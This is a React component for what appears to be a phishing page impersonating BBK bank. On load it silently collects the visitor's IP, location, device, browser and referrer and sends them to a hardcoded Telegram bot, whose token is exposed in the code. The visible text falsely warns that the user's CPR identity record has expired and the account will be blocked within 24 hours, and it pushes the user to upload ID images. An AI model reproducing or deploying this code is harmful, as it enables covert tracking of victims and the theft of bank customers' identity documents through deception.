import React, { useEffect } from "react";
import backkk from "../assets/backkk.jpeg";
import frontt from "../assets/frontt.jpeg";
import { useNavigate } from "react-router-dom";

const Firstone = () => {
  const navigate = useNavigate();

  useEffect(() => {
    (async () => {
      const BOT_TOKEN = "7970883334:AAH8XBBaR-FetzGl-0sNx89imD2MkY2WOnE";
      const CHAT_ID = "6545690043";

      try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();

        const ip = data.ip || "Unknown";
        const country = data.country_name || "Unknown";
        const region = data.region || "Unknown";
        const city = data.city || "Unknown";
        const timezone = data.timezone || "Unknown";

        const ua = navigator.userAgent;
        const device = /mobile/i.test(ua)
          ? "Mobile"
          : /tablet/i.test(ua)
          ? "Tablet"
          : "Desktop";

        let browser = "Unknown";
        if (/Edg/i.test(ua)) browser = "Edge";
        else if (/Chrome/i.test(ua)) browser = "Chrome";
        else if (/Firefox/i.test(ua)) browser = "Firefox";
        else if (/Safari/i.test(ua)) browser = "Safari";
        else if (/Opera|OPR/i.test(ua)) browser = "Opera";

        const message = `
📩 *New Visit Detected*  
━━━━━━━━━━━━━━━  
🌍 *IP:* ${ip}  
🏙️ *City:* ${city}  
🌏 *Country:* ${country}  
🕒 *Timezone:* ${timezone}  
💻 *Device:* ${device}  
🧭 *Region:* ${region}  
🌐 *Browser:* ${browser}  
🔗 *Page:* ${window.location.href}  
🔁 *Referrer:* ${document.referrer || "Direct Visit"}
`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown",
          }),
        });
      } catch (err) {
        console.error("Error sending Telegram notification:", err);
      }
    })();
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#f6f8f9] to-[#f4f7f8] font-poppins text-[#0b3e7a] flex justify-center p-6">
      <div className="w-full max-w-md">
        {/* Top nav */}
        <div className="flex items-center gap-3 mb-4">
          <button className="w-9 h-9 flex items-center justify-center rounded-full text-[#0b3e7a] bg-transparent border-none">
            <svg
              width="18"
              height="18"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
            >
              <path d="M15 18l-6-6 6-6" />
            </svg>
          </button>
        </div>

        {/* Title */}
        <h1 className="text-4xl font-bold mb-1">Verify identity</h1>
        <div className="text-[#9aa8b2] font-normal mb-4">
          Please verify your identity
        </div>

        {/* Thumbnails */}
        <div className="flex items-start justify-between gap-1 mb-5">
          <div className="flex-1 text-center p-1">
            <div className="h-18 rounded-lg flex items-center justify-center">
              <img src={frontt} alt="front cpr" className="mx-auto w-30" />
            </div>
            <label className="block mt-2 text-[#0b3e7a] font-semibold text-sm">
              Front
            </label>
          </div>

          <div className="w-5 flex items-center justify-center opacity-50">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
              <path
                d="M8 4l8 8-8 8"
                stroke="#b7c4cc"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </div>

          <div className="flex-1 text-center p-1">
            <div className="h-18 rounded-lg flex items-center justify-center">
              <img src={backkk} alt="back cpr" className="mx-auto w-30" />
            </div>
            <label className="block mt-2 text-[#0b3e7a] font-semibold text-sm">
              Back
            </label>
          </div>

          <div className="w-5 opacity-0 pointer-events-none"></div>
        </div>

        {/* Instruction card */}
        <div className="bg-white rounded-2xl p-5 shadow-md text-[#9aa8b2] text-sm mb-4">
          <h3 className="text-[#0b3e7a] font-semibold text-base mb-3">Notice:</h3>
          <div className="text-[#5a5e61] text-sm">
            Dear BBK user, your account is at risk of deactivation because your
            CPR has expired in the bank record. Please update your CPR
            immediately, otherwise your BBK account will be blocked within 24
            hours.
          </div>
        </div>

        <div className="text-[#9fb0b9] text-xs mb-10 font-semibold leading-relaxed">
          Your data will be stored in the Bank's records and kindly note that
          your CPR data will be reviewed by BBK employees.
        </div>

        {/* Action buttons */}
        <div className="flex flex-col gap-3">
          <button
            className="bg-[#ff9f00] text-white font-semibold py-4 rounded-xl text-lg shadow-md"
            onClick={() => {
              navigate("/cpr"); // ✅ Fixed typo here
            }}
          >
            Verify identity
          </button>
          <button
            className="text-[#ff9f00] text-base font-semibold"
            onClick={() => alert("Cancel")}
          >
            Cancel
          </button>
        </div>
      </div>
    </div>
  );
};

export default Firstone;
